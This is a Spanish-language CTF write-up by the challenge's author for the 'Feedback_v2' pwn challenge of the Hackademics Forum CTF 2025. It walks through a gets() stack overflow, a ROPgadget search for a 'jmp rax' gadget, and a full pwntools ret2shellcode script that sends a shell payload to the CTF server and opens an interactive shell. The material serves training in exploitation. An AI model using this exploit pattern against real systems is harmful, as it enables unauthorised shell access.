---
layout: post
title: Feedback_v2 HFCTF 2025
comments: true
categories: [Pwn, Writeups, HFCTF2025]
---

Aquí traigo el tercer reto que implementé para la categoría de Pwn para el [Hackademics Forum CTF](hackademics-forum.com). Este es el ejercicio que menos solves tuvo en Pwn aunque tampoco es realmente difícil.

# Overview

En este caso se trata de un *ret2shellcode*, en el que saltaremos a un código que ejecuta una shell en el stack.

<br>
![Image]({{ site.baseurl }}/images/posts/HFCTF.png){:width="250px"}
<br>

# Reconocimiento

Aunque no es necesario, si descompilamos veremos las siguientes funciones:

```c
void comment() {
    char buffer[200];
    printf("Deja una reseña sobre nuestro CTF: "); flush_buffers();
    gets(buffer);
}

int main() {
    banner();
    comment();
    return 0;
}
```

Vemos que ya no hay función flag. Sin embargo, disponemos de una llamada a *gets* en comment, con longitud suficiente para albergar un shellcode en el stack. Con lo que podemos desbordar el rsp e insertar saltar a dicho código.

Deberemos primero encontrar un gadget que nos permita saltar, podemos buscarlo con *ROPGadget*:

```bash
ROPgadget --binary feedback_v2 | grep jmp

[...]
0x00000000004010cc : jmp rax
[...]
```

Ese `jmp rax` debería servirnos. Además debemos buscar el offset hasta rsp de igual forma que en la [versión 1 del reto]({% post_url 2025-04-6-Feedback-HFCTF %}).

# Explotación

Para resolverlo debemos explotar el servidor, para ello utilizaremos este script:

```python
#!/bin/python3

from pwn import *

binary = '../gen/feedback_v2'
#elf = ELF(binary)

# p = remote('direccion.ip', puerto)
p = remote("ctf.hackademics-forum.com", 51425)

#p=process(binary)

# p = gdb.debug(binary, '''
#     break *comment+61
#     continue
# ''')

#0x00000000004010cc: jmp rax;
jmp_addr = 0x4010cc

#0x0000000000401016 : ret
ret = 0x401016

shellcode = asm(shellcraft.amd64.linux.sh(),arch='amd64')

offset = 216
padding = b'\x90' * (offset-len(shellcode))

payload = shellcode + padding + p64(jmp_addr)

#payload = b'\x90'*(offset) + p64(0x401690) + p64(jmp_addr)

print(payload)

log.info("Enviando exploit...")

p.sendline(payload)

p.interactive()
```